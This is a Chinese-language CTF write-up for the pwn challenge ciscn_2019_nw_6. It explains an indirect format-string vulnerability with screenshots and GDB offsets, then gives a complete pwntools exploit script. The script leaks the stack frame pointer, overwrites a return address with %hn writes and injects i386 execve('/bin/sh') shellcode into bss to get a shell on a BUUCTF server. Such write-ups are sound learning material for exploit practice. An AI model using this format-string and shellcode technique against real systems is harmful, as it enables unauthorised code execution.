# ciscn_2019_nw_6（fmt+shellcode）

# 查看

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450069234-0c8fc4d7-5275-491c-95b6-71e323cffd33.png)

32位啥都没开，存在fmt漏洞，猜测不在栈上

# ida

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450160482-2eeba105-ac19-47ea-9a85-0ec00d8357c4.png)

输入到s1

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450174653-8a675956-63ed-473b-8dfe-108ef5a4c6da.png)

bss段上

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450286984-306dc28d-df62-40f1-8b09-945f5662a654.png)

拷贝到s，![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450299432-fe23fe44-175a-4046-9fb3-cf0ce46d569f.png)

间接的fmt漏洞

先leak基址，再将puts_got改成system，输入binsh即可

# gdb

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450506745-d2c00df8-6618-4275-a1d0-ac046f555ab7.png)

偏移为4、8处是第一、二条栈链

17处可以leak基址

偏移为7处地址与got较近

![image.png](https://cdn.nlark.com/yuque/0/2020/png/403807/1596450611993-6f82bd83-0bfa-4b83-9794-6e205aabc824.png)

除此之外，还能用shellcode做，先读入shellcode到bss段，之后修改ret跳过去就可以了

# 脚本

[https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#%E5%88%A9%E7%94%A8%E6%A0%88%E5%86%85%E4%B8%A4%E4%B8%AA%E6%A0%88%E7%A9%BA%E9%97%B4%E7%9A%84%E6%8C%87%E9%92%88%E6%9D%A5%E6%94%B9%E5%86%99ret%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E9%A1%BA%E4%BE%BF%E6%9C%80%E5%90%8E%E5%86%99%E5%85%A5shellcode%E5%88%B0bss%EF%BC%8C%E7%84%B6%E5%90%8Eret%E8%B7%B3%E8%BF%87%E5%8E%BB](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去)

```
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
context.arch = "i386"
my_u64 = lambda x: u64(x.ljust(8, '\0'))
#libc=ELF('libc-2.23.so')
a=0
if a==1:
    #p = process(['./stack2'],env={"LD_PRELOAD":"./libc-2.23.so"})
    p=process('stack2')
else:
    p=remote('node3.buuoj.cn',25520)    

#0804A160
#leak ebp
p.recv()
payload = "%12$p"
p.sendline(payload)
p.recvuntil("0x")
ebp = int(p.recv(8),16)
ret_addr = ebp + 0xc - 6*0x4
payload = "%." + str(ret_addr % 0x10000) + "d%23$hn"
p.sendline(payload)
sleep(0.2)
payload = "%." + str(0xA170) + "d%59$hn"
payload = payload.ljust(4*4,"\x00")
payload += b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
p.sendline(payload)
sleep(0.2)
p.sendline("hello")
log.success("ebp: " + hex(ebp))
p.interactive()
```